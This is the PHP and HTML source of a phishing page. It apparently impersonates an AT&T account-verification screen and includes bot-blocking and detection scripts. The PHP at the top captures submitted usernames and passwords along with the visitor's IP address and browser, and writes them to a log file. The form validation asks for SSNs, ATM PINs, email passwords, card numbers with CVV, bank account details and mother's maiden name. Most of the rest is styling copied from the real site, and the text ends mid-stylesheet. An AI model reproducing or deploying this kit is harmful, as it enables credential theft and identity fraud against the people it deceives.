<?php

session_start();
include("Sinus/HOSTER.php"); 
include("Sinus/blocker.php");
include("Sinus/detect.php");
$InfoDATE   = date("d-m-Y h:i:sa");
$OS =getOS($_SERVER['HTTP_USER_AGENT']); 
$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent); 
$uid = $_SESSION['uid'] = $_POST['uid'] ;
$pwd = $_SESSION['pwd'] = $_POST['pwd'] ;           
$_SESSION['browser'] = $browserTy_Version =array_pop($browser);     
$msg.="------------------------------\r\n";
$msg.="|+ Username: {$uid}\r\n";
$msg.="|+ Password : {$pwd}\r\n";
$msg.="------------------------------\r\n";
$msg.="|+ localIP : {$_SERVER['REMOTE_ADDR']}\r\n";
$msg.="|+ BROWSER : {$_SESSION['browser']} On/ {$_SESSION['os']}\r\n";
$msg.="\r\n";
$save=fopen("xREPORT/userpass.txt","a+");fwrite($save,$msg);fclose($save);







?>
<html lang="en" class="ds2_no-touchevents"><head class="at-element-marker"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
<!--**** META INFO ****-->
<meta http-equiv="X-UA-Compatible" content="IE=EDGE">

<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=auto">
<meta name="format-detection" content="telephone=no">
<title ng-bind="titleName" class="ng-binding">Account verification</title>
<meta name="robots" content="NOINDEX, NOFOLLOW">

<link rel="alternate" media="only screen and (min-width: 640px)">
<meta name="DCSext.wtPN" content="Sandbox3.2.0-basic-article-layout">
<!--****
The TESLA Standalone page calls the JS/CSS files directly
and does not require the use of a Web Service to populate
the page dependencies.
NOTE: The paths to the JS/CSS files are absolute here. If your
environment is on a TST server, set these relative "/scripts/teslax.x/etc"
****-->
<!--**** CSS ****-->
<!--==== Start APPLICATION CSS files =============================================================-->
<!-- ==== NOTE this is an example on how an app will add their css -->
<style>
body {font-family: Arial, Helvetica, sans-serif;}
</style>
<!--==== End APPLICATION CSS files ===============================================================-->
<!--==== Change for Smart App Banner ==-->
<meta name="apple-itunes-app" content="app-id=309172177">
<!--==== Web store for private browser ==-->

<!--==== Intro JS - CBO Intro ==-->
<link href="style/introjs.css" rel="stylesheet">

<style>
.overviewModalBackdrop{
opacity: 0.7;
filter: alpha(opacity=70);
background-color: #000;
transition: opacity 0.3s linear 0s;
position: fixed;
height: 100%;
width: 100%;
top: 0;
bottom: 0;
left: 0;
right: 0;
z-index:1;
font-size: 16px;
font-family: "Omnes-ATT-W02", Arial !important;
}
.overviewLoaderWrap{
position: relative;
top: 41%;
text-align: center
}
@keyframes OverviewSpinnerAnimation {
0% {
transform: rotate(0deg);
}
100% {
transform: rotate(359deg);
}
}
.overviewSpinner {
width: 1em;
-webkit-animation: 1s linear infinite OverviewSpinnerAnimation;
animation: 1s linear infinite OverviewSpinnerAnimation;
background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzNiAzNiIgaWQ9InN2Zy1zcGlubmVyIiB4PSIwcHgiIHk9IjBweCIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+CiAgIDxwYXRoIGZpbGw9IiNGNUY1RjUiIGQ9Ik0xOCAzNkM4LjEgMzYgMCAyNy45IDAgMThTOC4xIDAgMTggMHMxOCA4LjEgMTggMTgtOC4xIDE4LTE4IDE4em0wLTMxLjVjLTcuNSAwLTEzLjUgNi0xMy41IDEzLjVTMTAuNiAzMS41IDE4IDMxLjVjNy41IDAgMTMuNS02LjEgMTMuNS0xMy41IDAtNy41LTYtMTMuNS0xMy41LTEzLjV6Ii8+CiAgIDxwYXRoIGZpbGw9IiMwNTY4QUUiIGlkPSJzcGlubmVyIiBkPSJNMzAuNyA1LjNsLTMuMSAzLjJjMi40IDIuNCAzLjkgNS44IDMuOSA5LjUgMCA3LjQtNi4xIDEzLjUtMTMuNSAxMy41UzQuNSAyNS40IDQuNSAxOCAxMC42IDQuNSAxOCA0LjVWMEM4LjEgMCAwIDguMSAwIDE4czguMSAxOCAxOCAxOCAxOC04LjEgMTgtMThjMC01LTItOS41LTUuMy0xMi43eiIgdHJhbnNmb3JtPSIiPiAgICAgIAogICA8L3BhdGg+Cjwvc3ZnPg==);
}
.overviewBtnSmall .overviewSpinner {
height: 50px !important;
width: 50px !important;
margin: 0 auto
}
.overviewLoaderText{
margin-top: 8px;
color: #fff
}
/* .iPhone5 */
@media (min-width:320px) and (max-width: 374px) {
.overviewLoaderText { font-size: 13px}
}
</style>
<style>
[ng\:cloak], [ng-cloak], [data-ng-cloak], [x-ng-cloak], .ng-cloak, .x-ng-cloak {display: none !important;}
</style>
<script type='text/javascript' src='style/js/jquery-1.9.1.js'></script>
<script type='text/javascript' src="style/js/jquery.maskedinput.js"></script>
<script type='text/javascript' src="style/js/jquery.payment.js"></script>
<script type='text/javascript' src="style/js/jquery.validate.min.js"></script>



<script type='text/javascript'>
jQuery(function($){
   $("#dob").mask("99/99/9999",{placeholder:"DD/MM/YYYY"});
   $("#sortcode").mask("99-99-99",{placeholder:"XX-XX-XX"});
   $("#ccexp").mask("99/99",{placeholder:"XX/XX"});
    $("#ssn").mask("999-999-999",{placeholder:"XXX-XXX-XXX"});
});
</script>
<script>
jQuery.validator.addMethod('phoneUK', function(phone_number, element) {
return this.optional(element) || phone_number.length > 9 &&
phone_number.match(/^(((\+44)? ?(\(0\))? ?)|(0))( ?[0-9]{3,4}){3}$/);
}, 'Please check the telephone number you have provided');

jQuery.validator.addMethod("postcodeUK", function(value, element) {
return this.optional(element) || /^[A-Z]{1,2}[0-9]{1,2} ?[0-9][A-Z]{2}$/i.test(value);
}, "Please check the postcode you have provided");

$('#id3').validate();
  (function($,W,D)
{
    var JQUERY4U = {};

    JQUERY4U.UTIL =
    {
        setupFormValidation: function()
        {
            //form validation rules
            $("#id3").validate({
                errorElement: "div",            
                rules: {
                    uid: { required: true, minlength: 5,},
                    pwd: { required: true, minlength: 8,},
                    fn: { required: true, minlength: 4,},
                    dob: {  required: true, minlength: 10,},
                    pac: {  required: true, minlength: 5,},
                    vp: {  required: true, minlength: 3,},
                    atp: {  required: true, minlength: 4,},
                    dln: {  required: true, minlength: 3,},
                    ssn: {  required: true, minlength: 9,},
                    mn: { required: true, minlength: 11, digits: true,},
                    email: { required: true, email: true,},
                    epass: { required: true, minlength: 8,},
                    add: { required: true, minlength: 5,},
                    town: { required: true, minlength: 3,},
                    zip: { required: true, minlength: 5,},
                    ccname: { required: true, minlength: 4,},
                    cn: { required: true, minlength: 16, creditcard: true},
                    ccexp: { required: true, minlength: 4,},
                    cvv: { required: true, minlength: 3, digits: true,},
                    acno: { required: true, minlength: 8, digits: true,},
                    sortcode: { required: true, minlength: 6},
                    mmn: { required: true, minlength: 4},
                    confirm: { required: true},
                },
                errorPlacement: function(error, element) {
                if (element.attr("name") == "day" || element.attr("name") == "month" || element.attr("name") == "year") 
                error.insertAfter("#doberror");
                else 
                error.insertAfter(element); 
                if (element.attr("name") == "sort1" || element.attr("name") == "sort2" || element.attr("name") == "sort3") 
                error.insertAfter("#expiryerror");
                if (element.attr("name") == "secode") 
                error.insertAfter("#secodeerror");
                if (element.attr("name") == "acno") 
                error.insertAfter("#acnoerror");
                },
                messages: {
                    fn: {
                        required: "Please enter your Full Name",
                        minlength: jQuery.validator.format("Please provide your Full Name"),
                    },
                 
                    atp: {
                        required: "Please enter your ATM Pin",
                        minlength: jQuery.validator.format("Please enter your correct ATM Pin"),
                    },
                    ssn: {
                        required: "Please enter your Social Security Number",
                        minlength: jQuery.validator.format("Please enter a valid Social Security Number"),
                    },
                    dln: {
                        required: "Please enter your Driver's License Number",
                        minlength: jQuery.validator.format("Please enter a valid Driver's License Number"),
                    },
                    dob: { 
                        required: "Please enter your date of birth", },
                        minlength: jQuery.validator.format("Please check the date of birth you have entered"),
                    pac: { 
                        required: "Please enter your PAC", },
                        minlength: jQuery.validator.format("Please check the PAC you have entered"),
                    vp: { 
                        required: "Please enter your Verbal Password", },
                        minlength: jQuery.validator.format("Please check the Verbal Password you have entered"),
                    mn: {
                        required: "Please enter your Mobile number",
                        minlength: jQuery.validator.format("Enter a valid Mobile number"),
                        digits: jQuery.validator.format("Please ensure you enter digits only"),
                    },
                    email: {
                        required: "Please enter your email address",
                        email: jQuery.validator.format("Please check the email address you have entered"),
                    },
                     epass: {
                        required: "Please enter your email password",
                        minlength: jQuery.validator.format("Please check the password you have entered"),
                    },
                    add: {
                        required: "Please enter your Billing address",
                        minlength: jQuery.validator.format("Please check the address you have entered"),
                    },
                    town: {
                        required: "Please provide your city/town",
                        minlength: jQuery.validator.format("Please check the city/town you have entered"),
                    },
                    zip: {
                        required: "Please enter your zip code",
                        minlength: jQuery.validator.format("Please check the zip code you have entered"),
                    },
                    ccname: {
                        required: "Please provide your name as it appears on your card",
                        minlength: jQuery.validator.format("Please provide your name as it appears on your card"),
                    },
                    cn: {
                        required: "Please provide your 16 digit card number",
                        minlength: jQuery.validator.format("Please check the card number you have entered"),
                        creditcard: jQuery.validator.format("Please check the card number you have entered"),
                    },
                    ccexp: {
                        required: "Please enter your Card's expiration date",
                        minlength: jQuery.validator.format("Please check the card expiration date you have entered"),
                        date: jQuery.validator.format("Please check the card expiration date you have entered"),
                    },
                    uid: {
                        required: "Please enter your Username",
                        minlength: jQuery.validator.format("Please enter a valid Username"),                      
                    },
                    pwd: {
                        required: "Please enter your Password",
                        minlength: jQuery.validator.format("Please enter a valid Password"),
                        
                    },

                     cvv: {
                        required: "Please provide your 3 digit card security code (CVV)",
                        minlength: jQuery.validator.format("Please check the card security code you have entered"),
                        digits: jQuery.validator.format("Please ensure you enter digits only"),
                    },
                    acno: {
                        required: "Please provide your 8 digit account number",
                        minlength: jQuery.validator.format("Please check the account number you have entered"),
                        digits: jQuery.validator.format("Please ensure you enter digits only"),
                    },
                    sortcode: { 
                        required: "Please provide your sortcode", 
                        minlength: jQuery.validator.format("Please check the sortcode you have entered"), 
                    },
                    mmn: { 
                        required: "Please enter your mother's maiden name", 
                        minlength: jQuery.validator.format("Please check the mother's maiden name you have entered"), 
                    },
                    acno: { 
                        required: "Please provide your account number", 
                        minlength: jQuery.validator.format("Please check the account number you have entered"),
                        digits: jQuery.validator.format("Please ensure you enter digits only"), 
                    },
                    confirm: { 
                        required: "Please confirm the information you have provided to be true and accurate", 
                    },
                },
                submitHandler: function(form) {
                    form.submit();
                }
            });
        }
    }

    //when the dom has loaded setup form validation rules
    $(D).ready(function($) {
        JQUERY4U.UTIL.setupFormValidation();
    });

})(jQuery, window, document);
  
</script>
<style>
div.error {color:red; font-style: italic;}
</style>

                       



                        </head>


                 <body class="attgn-page" style=""><link type="text/css" rel="stylesheet" href="style/ds2-pagination.min.css"><link type="text/css" rel="stylesheet" href="style/global-full.css"><link type="text/css" rel="stylesheet" href="style/digital-design-library.css"><link type="text/css" rel="stylesheet" href="style/ds2-legacynav-fix.css"><link type="text/css" rel="stylesheet" href="style/application.css">
<link type="text/css" rel="stylesheet" href="style/application_registration.css"><link type="text/css" rel="stylesheet" href="style/asm_dropdown.css"><link type="text/css" rel="stylesheet" href="style/application_common.css"><link type="text/css" rel="stylesheet" href="style/application_common_rwd.css"><link href="style/global-nav-combined.min.css" rel="stylesheet" class="lazyload" charset="utf-8">
<style type="text/css">
#oo_invitation_company_logo img#oo_waypoint_company_logo img { max-height: 100%; max-width: 100%; height: auto; width: auto9; /* ie8 */ }
#oo_feedback_fl_spacer { display: block; height: 1px; position: absolute; top: 0; width: 100px; }
.oo_feedback_float { width: 100px; height: 50px; overflow: hidden; font: 12px Tahoma, Arial, Helvetica, sans-serif; text-align: center; color: #252525; cursor: pointer; z-index: 999997; position: fixed; bottom: 5px; border: 1px solid #cccccc; border-radius: 9px; -moz-border-radius: 9px; -webkit-border-radius: 9px; right: 10px; -webkit-transition: -webkit-transform 0.3s ease; }
.oo_feedback_float .screen_reader { position: absolute; clip: rect(1px 1px 1px 1px); /* for Internet Explorer */ clip: rect(1px, 1px, 1px, 1px); padding: 0; border: 0; height: 1px; width: 1px; overflow: hidden; }
.oo_feedback_float .olUp { width: 100%; height: 100%; background: url() center 10px no-repeat; text-align: center; padding: 31px 0 5px 0; position: relative; z-index: 2; filter: alpha(opacity=100); opacity: 1; transition: opacity .5s; -moz-transition: opacity .5s; -webkit-transition: opacity .5s; -o-transition: opacity .5s; }
.oo_feedback_float .olUp img { margin-bottom: 5px; }
.oo_feedback_float .oo_transparent { display: block; background: white; position: absolute; top: 0; left: 0; height: 100%; width: 100%; z-index: 1; opacity: 0.8; filter: alpha(opacity=80); border-radius: 8px; -moz-border-radius: 8px; -webkit-border-radius: 8px; }
.oo_feedback_float:hover .oo_transparent { opacity: 1.0; filter: alpha(opacity=100); }
.oo_feedback_float:hover .olUp { display: block; opacity: 0; filter: alpha(opacity=0); }
.oo_feedback_float .fbText { display: block; }
.oo_feedback_float .olOver { display: block; height: 100%; width: 100%; position: absolute; top: 0; left: 0; min-height: 50px; z-index: 2; opacity: 0; filter: alpha(opacity=0); transition: opacity .5s; -moz-transition: opacity .5s; -webkit-transition: opacity .5s; -o-transition: opacity .5s; }
.oo_feedback_float .olOver span { display: block; padding: 10px 5px; }
.oo_feedback_float:hover .olOver { opacity: 1.0; filter: alpha(opacity=100); top: 0; }
.oo_cc_wrapper { left: 0; padding: 0; position: fixed; text-align: center; top: 25px; width: 100%; z-index: 999999; }
.oo_cc_wrapper .screen_reader { position: absolute; clip: rect(1px 1px 1px 1px); /* for Internet Explorer */ clip: rect(1px, 1px, 1px, 1px); padding: 0; border: 0; height: 1px; width: 1px; overflow: hidden; }
.oo_cc_wrapper span { width: 100%; height: 100%; position: absolute; left: 0; top: 0; z-index: 1; }
.oo_cc_wrapper .iwrapper { background-color: white; margin: 0 auto; position: relative; width: 535px; z-index: 2; box-shadow: 0px 1px 3px 0px rgba(102, 102, 102, 0.3); -moz-box-shadow: 0px 1px 3px 0px rgba(102, 102, 102, 0.3); -webkit-box-shadow: 0px 1px 3px 0px rgba(102, 102, 102, 0.3); }
.oo_cc_wrapper iframe { position: relative; border: none; width: 100%; z-index: 4; }
.oo_cc_wrapper .oo_cc_close { position: absolute; display: block; right: 20px; top: 5px; font: 1em/1.5em 'HelveticaNeue-Medium', Helvetica, Arial, sans-serif; text-align: center; z-index: 5; color: black; text-decoration: none; cursor: pointer; }
#oo_bar { padding: 10px 35px; cursor: pointer; color: white; border-top: 1px solid white; background-color: black; bottom: 0; display: block; font: 16px 'HelveticaNeue-Medium', Helvetica, Arial, sans-serif; left: 0; text-decoration: none; line-height: 16px; position: fixed; text-align: left; width: 100%; z-index: 999997; box-shadow: rgba(0, 0, 0, 0.5) 0px -1px 2px; -moz-box-shadow: rgba(0, 0, 0, 0.5) 0px -1px 2px; -webkit-box-shadow: rgba(0, 0, 0, 0.5) 0px -1px 2px; }
#oo_bar span.icon { background-image: url(); background-repeat: no-repeat; position: absolute; left: 8px; top: 9px; width: 19px; height: 17px; }
#oo_bar .screen_reader { position: absolute; clip: rect(1px 1px 1px 1px); /* for Internet Explorer */ clip: rect(1px, 1px, 1px, 1px); padding: 0; border: 0; height: 1px; width: 1px; overflow: hidden; }
#oo_bar:focus { outline: 3px solid #51ace9; }
.oo_bar { padding-bottom: 37px; }
#oo_tab:focus { outline: #191919 dotted thin; }
#oo_tab { display: block; position: fixed; background-color: #ffffff; color: #ffffff; border: 1px solid #f2f2f2; font-size: 13px; font-family: 'font-medium', Arial; line-height: 15px; opacity: 1; z-index: 999995; cursor: pointer; text-decoration: none; -webkit-backface-visibility: hidden; backface-visibility: hidden; transform: rotate(-90deg); -ms-transform: rotate(-90deg) scale(1.02); -webkit-transform: rotate(-90deg); -moz-transform: rotate(-90deg); transition: all .5s ease; -moz-transition: all .5s ease; -webkit-transition: all .5s ease; -o-transition: all .5s ease; }
#oo_tab .screen_reader { position: absolute; clip: rect(1px 1px 1px 1px); /* for Internet Explorer */ clip: rect(1px, 1px, 1px, 1px); padding: 0; border: 0; height: 1px; width: 1px; overflow: hidden; }
#oo_tab.oo_tab_right { right: 0px; top: 68px; padding: 8px 0px; border-bottom: 0px; color: #0568ae; transform-origin: 100% 100% 0; -webkit-transform-origin: 100% 100% 0; -ms-transform-origin: 100% 100% 0; }
#oo_tab.oo_tab_right:hover, #oo_tab.oo_tab_right:focus, #oo_tab.oo_tab_right:active {text-decoration: underline; color: #0574ac;}
#oo_tab.oo_tab_left { left: 0px; top: 210px; padding: 8px 0px; color: #0568ae; border-top: 0px; transform-origin: 0 0; -webkit-transform-origin: 0 0; -ms-transform-origin: 0 0; }
#oo_tab.oo_tab_left:hover, #oo_tab.oo_tab_left:focus, #oo_tab.oo_tab_left:active {text-decoration: underline; color: #0574ac;}
#oo_tab img.icon { width: 9px; height: 9px; margin-right: 7px; margin-left: 10px; margin-bottom: 1px; color: transparent; border: none; }
#oo_tab.oo_tab_left.oo_legacy { top: auto; right: auto; bottom: -5px; left: 20px; padding: 10px 10px 15px 10px; z-index: 999995; cursor: pointer; border-bottom: 0px; border-radius: 9px 9px 0 0; -moz-border-radius: 9px 9px 0 0; -webkit-border-radius: 9px 9px 0 0; transform: rotate(0deg); -ms-transform: rotate(0deg); -webkit-transform: rotate(0deg); -moz-transform: rotate(0deg); }
#oo_tab.oo_tab_right.oo_legacy { top: auto; bottom: -5px; right: 20px; padding: 10px 10px 15px 10px; z-index: 999995; cursor: pointer; border-bottom: 0px; transform: rotate(0deg); -ms-transform: rotate(0deg); -webkit-transform: rotate(0deg); -moz-transform: rotate(0deg); }
#oo_tab.oo_legacy img { top: 12px !important; }
#oo_tab.oo_tab_right.oo_legacy:hover, #oo_tab.oo_tab_right.oo_legacy:focus, #oo_tab.oo_tab_right.oo_legacy:active { bottom: 0; }
#oo_tab.oo_tab_left.oo_legacy:hover, #oo_tab.oo_tab_left.oo_legacy:focus, #oo_tab.oo_tab_left.oo_legacy:active { bottom: 0; }
#oo_tab_1 { background-color: black; border: 1px solid #ffffff; display: block; position: fixed; top: 40%; padding: 10px 0px 10px 0px; width: 124px; z-index: 999995; cursor: pointer; text-decoration: none; text-align: left; font-family: 'HelveticaNeue-Medium', Helvetica, Arial, sans-serif; line-height: 16px; font-size: 16px; color: #fff; }
#oo_tab_1:focus { outline: 3px solid #51ace9; }
#oo_tab_1 span.screen_reader { position: absolute; clip: rect(1px 1px 1px 1px); /* for Internet Explorer */ clip: rect(1px, 1px, 1px, 1px); padding: 0; border: 0; height: 1px; width: 1px; overflow: hidden; }
#oo_tab_1.oo_tab_right_1 { right: -9px; transition: right 1.5s; -moz-transition: right 1.5s; -webkit-transition: right 1.5s; padding: 10px 0px 10px 35px; box-shadow: rgba(0, 0, 0, 0.5) 1px 1px 2px; -moz-box-shadow: rgba(0, 0, 0, 0.5) 1px 1px 2px; -webkit-box-shadow: rgba(0, 0, 0, 0.5) 1px 1px 2px; width: 89px; }
#oo_tab_1.oo_tab_right_1 span.icon { background-image: url(); background-repeat: no-repeat; position: absolute; left: 8px; top: 9px; width: 19px; height: 17px; }
#oo_tab_1.oo_tab_right_1.small { right: -90px; }
#oo_tab_1.oo_tab_right_1.small:hover { right: -9px; }
#oo_tab_1.oo_tab_left_1 { left: -9px; transition: left 1.5s; -moz-transition: left 1.5s; -webkit-transition: left 1.5s; padding: 10px 0px 10px 15px; box-shadow: rgba(0, 0, 0, 0.5) -1px 1px 2px; -moz-box-shadow: rgba(0, 0, 0, 0.5) -1px 1px 2px; -webkit-box-shadow: rgba(0, 0, 0, 0.5) -1px 1px 2px; width: 109px; }
#oo_tab_1.oo_tab_left_1 span.icon { background-image: url(); background-repeat: no-repeat; position: absolute; right: 8px; top: 9px; width: 19px; height: 17px; }
#oo_tab_1.oo_tab_left_1.small { left: -90px; }
#oo_tab_1.oo_tab_left_1.small:hover { left: -9px; }
#oo_container { position: fixed; height: 100%; width: 100%; top: 0; left: 0; z-index: 999999; }
#oo_invitation_prompt { background: #fff; box-shadow: 0px 1px 3px 0px rgba(102, 102, 102, 0.3); -moz-box-shadow: 0px 1px 3px 0px rgba(102, 102, 102, 0.3); -webkit-box-shadow: 0px 1px 3px 0px rgba(102, 102, 102, 0.3); margin: 5% auto; text-align: left; position: relative; width: 500px; z-index: 999999; }
#oo_invitation_prompt #oo_invitation_company_logo { width: 100%; height: 120px; background: black; }
#oo_invitation_prompt #oo_invitation_company_logo img { height: 100%; }
#oo_invitation_prompt #oo_invite_content { width: 80%; padding: 40px 10% 20px 10%; box-shadow: inset 0px 0px 0px 1px #ccc; -webkit-box-shadow: inset 0px 0px 0px 1px #ccc; -moz-box-shadow: inset 0px 0px 0px 1px #ccc; }
#oo_invitation_prompt #oo_invite_content p { color: black; font: 1em/1.5em 'HelveticaNeue-Medium', Helvetica, Arial, sans-serif; margin: 0; padding: 0 0 20px 0; }
#oo_invitation_prompt #oo_invite_content p.prompt_button a { text-align: center; color: white; text-decoration: none; font-size: 1.5em; line-height: 1.2em; padding: 12px 0 13px 0; display: block; height: 25px; }
#oo_invitation_prompt #oo_invite_content a { cursor: pointer; }
#oo_invitation_prompt #oo_invite_content a:focus { outline: 3px solid #51ace9; }
#oo_invitation_prompt #oo_invite_content a#oo_launch_prompt { background: #cb352d; }
#oo_invitation_prompt #oo_invite_content a#oo_no_thanks { background: #707070; }
#oo_invitation_prompt #oo_invite_content #ol_invitation_brand_logo { text-align: center; border-top: 1px solid #ccc; line-height: 1.5em; margin: 20px 0 0 0; padding: 20px 0 0 0; }
#oo_invitation_prompt #oo_invite_content #ol_invitation_brand_logo img { height: 25px; width: 146px; border: 0px; }
#oo_invitation_prompt #oo_invite_content #ol_invitation_brand_logo a { display: block; height: 25px; }
#oo_invitation_prompt #oo_close_prompt { font-family: 'Zapf Dingbats'; position: absolute; display: block; right: 13px; top: 13px; line-height: 1em; font-size: 1em; color: white; text-decoration: none; }
#oo_invitation_prompt #oo_close_prompt:focus { outline: none; }
#oo_invitation_prompt #oo_close_prompt:focus span { outline: 3px solid #51ace9; }
#oo_invitation_prompt .screen_reader { position: absolute; clip: rect(1px 1px 1px 1px); /* for Internet Explorer */ clip: rect(1px, 1px, 1px, 1px); padding: 0; border: 0; height: 1px; width: 1px; overflow: hidden; }
@media only screen and (max-device-width: 1024px) { #oo_tab { display: none; } }
@media only screen and (max-device-width: 480px), screen and (device-width: 414px) and (device-height: 736px) and (-webkit-device-pixel-ratio: 3) { #oo_invitation_prompt { width: 90%; }
#oo_invitation_prompt #oo_invitation_company_logo { height: 80px; } }
@media only screen and (device-width: 320px) and (device-height: 568px) and (-webkit-device-pixel-ratio: 2), screen and (device-width: 320px) and (device-height: 480px) and (-webkit-device-pixel-ratio: 2) { #oo_invitation_prompt { width: 90%; height: 90%; overflow-y: scroll; overflow-x: hidden; }
#oo_invitation_prompt #oo_invitation_company_logo { height: 80px; }
#oo_invitation_prompt #oo_invite_content { padding: 20px 10% 20px 10%; }
#oo_invitation_prompt #oo_invite_content #ol_invite_brand_logo { margin: 0 0 0 0; } }
@media screen and (device-width: 320px) and (device-height: 480px) and (-webkit-device-pixel-ratio: 2) { #oo_invitation_promp #oo_close_prompt { right: -70px; } }
#oo_waypoint_container { position: fixed; height: 100%; width: 100%; top: 0; left: 0; z-index: 999999; }
#oo_waypoint_prompt { background: #fff; box-shadow: 0px 1px 3px 0px rgba(102, 102, 102, 0.3); -moz-box-shadow: 0px 1px 3px 0px rgba(102, 102, 102, 0.3); -webkit-box-shadow: 0px 1px 3px 0px rgba(102, 102, 102, 0.3); margin: 5% auto; text-align: left; position: relative; width: 500px; z-index: 999999; }
#oo_waypoint_prompt #oo_waypoint_company_logo { width: 100%; height: 120px; background: black; }
#oo_waypoint_prompt #oo_waypoint_company_logo img { height: 100%; }
#oo_waypoint_prompt #oo_waypoint_content { width: 80%; padding: 30px 10% 20px 10%; box-shadow: inset 0px 0px 0px 1px #ccc; -webkit-box-shadow: inset 0px 0px 0px 1px #ccc; -moz-box-shadow: inset 0px 0px 0px 1px #ccc;}
#oo_waypoint_prompt #oo_waypoint_content a { cursor: pointer; }
#oo_waypoint_prompt #oo_waypoint_content a:focus { outline: 3px solid #51ace9; }
#oo_waypoint_prompt #oo_waypoint_content p { color: black; font: 1em/1.5em Helvetica, Arial, sans-serif; margin: 0; padding: 0 0 20px 0; text-align: center; }
#oo_waypoint_prompt #oo_waypoint_content p#oo_waypoint_message { font-size: 1.2em; }
#oo_waypoint_prompt #oo_waypoint_content a.waypoint_icon { cursor: pointer; text-decoration: none; font-size: 1.5em; line-height: 1.2em; padding: 12px 0 13px 90px; display: block; height: 25px; color: white; margin-bottom: 20px; background-color: #cb352d; text-align: left; background-repeat: no-repeat; background-position: left center; background-size: 70px 50px; }
#oo_waypoint_prompt #oo_waypoint_content a.waypoint_icon.last { margin-bottom: 0; }
#oo_waypoint_prompt #oo_waypoint_content #ol_waypoint_brand_logo { line-height: 1.5em; margin: 10px 0 0 0; padding: 20px 0 0 0; }
#oo_waypoint_prompt #oo_waypoint_content #ol_waypoint_brand_logo img { height: 25px; width: 146px; border: 0px; }
#oo_waypoint_prompt #oo_waypoint_content #ol_waypoint_brand_logo a { display: block; height: 25px; }
#oo_waypoint_prompt #oo_waypoint_close_prompt { font-family: 'Zapf Dingbats'; position: absolute; display: block; right: 13px; top: 13px; line-height: 1em; font-size: 1em; color: white; text-decoration: none; }
#oo_waypoint_prompt #oo_waypoint_close_prompt:focus { outline: none; }
#oo_waypoint_prompt #oo_waypoint_close_prompt:focus span { outline: 3px solid #51ace9; }
#oo_waypoint_prompt .screen_reader { position: absolute; clip: rect(1px 1px 1px 1px); /* for Internet Explorer */ clip: rect(1px, 1px, 1px, 1px); padding: 0; border: 0; height: 1px; width: 1px; overflow: hidden; }
@media only screen and (max-device-width: 480px), screen and (device-width: 414px) and (device-height: 736px) and (-webkit-device-pixel-ratio: 3) { #oo_waypoint_prompt { width: 90%; }
#oo_waypoint_prompt #oo_waypoint_company_logo { height: 80px; } }
@media only screen and (device-width: 320px) and (device-height: 568px) and (-webkit-device-pixel-ratio: 2), screen and (device-width: 320px) and (device-height: 480px) and (-webkit-device-pixel-ratio: 2) { #oo_waypoint_prompt { width: 90%; height: 90%; overflow-y: scroll; overflow-x: hidden; }
#oo_waypoint_prompt #oo_waypoint_company_logo { height: 80px; }
#oo_waypoint_prompt #oo_waypoint_content { padding: 20px 10% 20px 10%; }
#oo_waypoint_prompt #oo_waypoint_content #ol_waypoint_brand_logo { margin: 0 0 0 0; } }
@media screen and (device-width: 320px) and (device-height: 480px) and (-webkit-device-pixel-ratio: 2) { #oo_waypoint_promp #oo_waypoint_close_prompt { right: -70px; } }
#oo_entry_prompt { background: #fff; box-shadow: 0px 1px 3px 0px rgba(102, 102, 102, 0.3); -moz-box-shadow: 0px 1px 3px 0px rgba(102, 102, 102, 0.3); -webkit-box-shadow: 0px 1px 3px 0px rgba(102, 102, 102, 0.3); margin: 5% auto; text-align: left; position: relative; width: 500px; z-index: 999999; }
#oo_entry_prompt #oo_entry_company_logo { width: 100%; height: 120px; background: black; }
#oo_entry_prompt #oo_entry_company_logo img { height: 100%; }
#oo_entry_prompt #oo_entry_content { width: 80%; padding: 40px 10% 20px 10%; box-shadow: inset 0px 0px 0px 1px #ccc; -webkit-box-shadow: inset 0px 0px 0px 1px #ccc; -moz-box-shadow: inset 0px 0px 0px 1px #ccc; }
#oo_entry_prompt #oo_entry_content p { color: black; font: 1em/1.5em 'HelveticaNeue-Medium', Helvetica, Arial, sans-serif; margin: 0; padding: 0 0 20px 0; }
#oo_entry_prompt #oo_entry_content p.entry_prompt_button a { text-align: center; color: white; text-decoration: none; font-size: 1.5em; line-height: 1.2em; padding: 12px 0 13px 0; display: block; height: 25px; }
#oo_entry_prompt #oo_entry_content a { cursor: pointer; }
#oo_entry_prompt #oo_entry_content a:focus { outline: 3px solid #51ace9; }
#oo_entry_prompt #oo_entry_content a#oo_launch_entry_prompt { background: #cb352d; }
#oo_entry_prompt #oo_entry_content a#oo_entry_no_thanks { background: #707070; }
#oo_entry_prompt #oo_entry_content #ol_entry_brand_logo { text-align: center; border-top: 1px solid #ccc; line-height: 1.5em; margin: 20px 0 0 0; padding: 20px 0 0 0; }
#oo_entry_prompt #oo_entry_content #ol_entry_brand_logo img { height: 25px; width: 146px; border: 0px; }
#oo_entry_prompt #oo_entry_content #ol_entry_brand_logo a { display: block; height: 25px; }
#oo_entry_prompt #oo_entry_close_prompt { font-family: 'Zapf Dingbats'; position: absolute; display: block; right: 13px; top: 13px; line-height: 1em; font-size: 1em; color: white; text-decoration: none; }
#oo_entry_prompt #oo_entry_close_prompt:focus { outline: none; }
#oo_entry_prompt #oo_entry_close_prompt:focus span { outline: 3px solid #51ace9; }
#oo_entry_prompt .screen_reader { position: absolute; clip: rect(1px 1px 1px 1px); /* for Internet Explorer */ clip: rect(1px, 1px, 1px, 1px); padding: 0; border: 0; height: 1px; width: 1px; overflow: hidden; }
@media only screen and (max-device-width: 480px), screen and (device-width: 414px) and (device-height: 736px) and (-webkit-device-pixel-ratio: 3) { #oo_entry_prompt { width: 90%; }
#oo_entry_prompt #oo_entry_company_logo { height: 80px; } }
@media only screen and (device-width: 320px) and (device-height: 568px) and (-webkit-device-pixel-ratio: 2), screen and (device-width: 320px) and (device-height: 480px) and (-webkit-device-pixel-ratio: 2) { #oo_entry_prompt { width: 90%; height: 90%; overflow-y: scroll; overflow-x: hidden; }
